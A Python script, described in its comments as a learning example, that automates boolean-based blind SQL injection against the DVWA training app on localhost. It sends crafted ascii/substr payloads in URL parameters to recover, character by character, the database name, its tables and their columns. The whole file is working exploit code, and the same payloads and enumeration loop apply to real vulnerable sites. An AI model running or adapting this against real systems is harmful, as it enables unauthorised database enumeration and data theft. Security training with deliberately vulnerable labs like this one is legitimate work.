import requests
from bs4 import BeautifulSoup

# learning blind injection example Python script
# reference https://www.itheima.com/news/20210621/135847.html
# https://blog.csdn.net/yezi1993/article/details/109644944


cookie = "PHPSESSID=n5mvl5f691v6r0v3hqnqm4iqb2; security=low"
headers = {
    "Cookie": cookie,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0"
}
url = "http://127.0.0.1:28080/vulnerabilities/sqli_blind/?id=1000&Submit=Submit"
right_info = 'User ID exists in the database.'
wrong_info = 'User ID is MISSING from the database.'
MAX_LENGTH = 999

MIN_DATABASE_NAME_ASCII = 45
MAX_DATABASE_NAME_ASCII = 122

#
def get_request_result(url):
    r = requests.get(url, headers=headers)
    html = r.text
    # print(html)
    soup_texts = BeautifulSoup(html, 'html.parser')
    ret_div = soup_texts.find(class_='vulnerable_code_area')
    result = ret_div.find('pre')
    return result.get_text()

def determine_database_length():
    length = 0
    l = 1
    while l <= MAX_LENGTH:
        url = f"http://127.0.0.1:28080/vulnerabilities/sqli_blind/?id=1'+and+length(database())%3D{l}+%23--+&Submit=Submit"
        r = get_request_result(url)
        print(r)
        print(l)
        if r == right_info:
            break
        elif r == wrong_info:
            print("wrong length")
        l = l + 1

    return l


def determine_database_name(db_length):
    """
    :param db_length:  database length
    :return: database name

    1' and ascii(substr(database(),1,1))=97 #--
    """
    db_name = ""
    for i in range(1, db_length + 1):
        print(f"i == {i}")
        for c in range(MIN_DATABASE_NAME_ASCII, MAX_DATABASE_NAME_ASCII + 1):
            url = f"http://127.0.0.1:28080/vulnerabilities/sqli_blind/?id=1%27+and+ascii%28substr%28database%28%29%2C{i}%2C1%29%29%3D{c}+%23--&Submit=Submit#"
            r = get_request_result(url)
            if r == right_info:
                print(chr(c))
                db_name = db_name + chr(c)
                break
            elif r == wrong_info:
                # print("wrong length")
                pass

    return db_name


def determine_table_numbers(db_name):
    """
    :param db_name:  database name
    :return:
    1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=1 #-- //有1个表
    """
    for i in range(1, MAX_LENGTH + 1):
        url = f"http://127.0.0.1:28080/vulnerabilities/sqli_blind/?id=1%27+and+%28select+count%28table_name%29+from+information_schema.tables+where+table_schema%3D%27{db_name}%27%29%3D{i}+%23--&Submit=Submit#"
        r = get_request_result(url)
        if r == right_info:
            return i
        elif r == wrong_info:
            pass
        else:
            pass


def determine_table_name_length(db_name, param):
    """
    determine the length of table name in order
    :param db_name:
    :param param:
    :return:

    1' and length(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1))=1 #--
    """
    for i in range(1, MAX_LENGTH + 1):
        url = f"http://127.0.0.1:28080/vulnerabilities/sqli_blind/?id=1%27+and+length%28substr%28%28select+table_name+from+information_schema.tables+where+table_schema%3D%27{db_name}%27+limit+{param-1}%2C1%29%2C1%29%29%3D{i}+%23--&Submit=Submit#"
        r = get_request_result(url)
        if r == right_info:
            return i
        else:
            pass


def determine_table_name(db_name,order, length):
    """

    :param db_name:
    :param length:
    :return:
    """
    "determine the length the table name in order"
    table_name = ""
    for i in range(1, length + 1):
        for c in range(MIN_DATABASE_NAME_ASCII, MAX_DATABASE_NAME_ASCII + 1):
            url = f"http://127.0.0.1:28080/vulnerabilities/sqli_blind/?id=1%27+and+ascii%28substr%28%28select+table_name+from+information_schema.tables+where+table_schema%3D%27{db_name}%27+limit+{order-1}%2C1%29%2C{i}%29%29%3D{c}+%23--&Submit=Submit#"
            r = get_request_result(url)
            if r == right_info:
                print(chr(c))
                table_name = table_name + chr(c)
                break
            elif r == wrong_info:
                # print("wrong length")
                pass

    return table_name


def determine_table_column_numbers(table_name):
    """
    :param table_name:
    :return:
    """
    for i in range(1, MAX_LENGTH + 1):
        url = f"http://127.0.0.1:28080/vulnerabilities/sqli_blind/?id=1%27+and+%28select+count%28column_name%29+from+information_schema.columns+where+table_name%3D%27{table_name}%27%29%3D{i}+%23--&Submit=Submit#"
        r = get_request_result(url)
        if r == right_info:
            return i
        else:
            pass


def determine_table_column_length(table_name, order):
    """
    :param table_name:
    :param order:
    :return:
    """
    for i in range(1, MAX_LENGTH + 1):
        url = f"http://127.0.0.1:28080/vulnerabilities/sqli_blind/?id=1%27+and+length%28substr%28%28select+column_name+from+information_schema.columns+where+table_name%3D%27{table_name}%27+limit+{order-1}%2C1%29%2C1%29%29%3D{i}+%23--&Submit=Submit#"
        r = get_request_result(url)
        if r == right_info:
            return i
        else:
            pass


def determine_table_column_name(table_name, order, length):
    """
    determine the name of the column in the table in order
    :param length:
    :param table_name:
    :param order:
    :return:
    """

    col_name = ""
    for i in range(1, length + 1):
        for c in range(MIN_DATABASE_NAME_ASCII, MAX_DATABASE_NAME_ASCII + 1):
            url = f"http://127.0.0.1:28080/vulnerabilities/sqli_blind/?id=1%27+and+ascii%28substr%28%28select+column_name+from+information_schema.columns+where+table_name%3D%27{table_name}%27+limit+{order-1}%2C1%29%2C{i}%29%29%3D{c}+%23--&Submit=Submit#"
            r = get_request_result(url)
            if r == right_info:
                # print(chr(c))
                col_name = col_name + chr(c)
                break
            elif r == wrong_info:
                # print("wrong length")
                pass
    return col_name



def main():
    """
    blind sql injection main
    """
    db_length = determine_database_length()
    print(f"database name length is: {db_length}")
    db_name = determine_database_name(db_length)
    print(f"database name is: {db_name}")
    table_nums = determine_table_numbers(db_name)
    print(f"there is {table_nums} tables in {db_name} database")

    tables = []
    for i in range(1, table_nums + 1):
        length = determine_table_name_length(db_name, i)
        print(f"the {i}th table length is {length}")
        table_name = determine_table_name(db_name, i ,length)
        print(f"the {i}th table name is {table_name}")
        tables.append(table_name)

    table_columns = {}
    for t in tables:
        colum_numbers = determine_table_column_numbers(t)
        colums = []
        print(f"{t} has {colum_numbers} columns")
        for c in range(1, colum_numbers + 1):
            col_length = determine_table_column_length(t,c)
            col_name = determine_table_column_name(t, c, col_length)
            print(f"table {t}, the {c}th column length is {col_length}, column name is {col_name}")
            colums.append(col_name)

        table_columns[t] = colums

    print(table_columns)

    print("Now getting all the data in the database")




if __name__ == '__main__':
    main()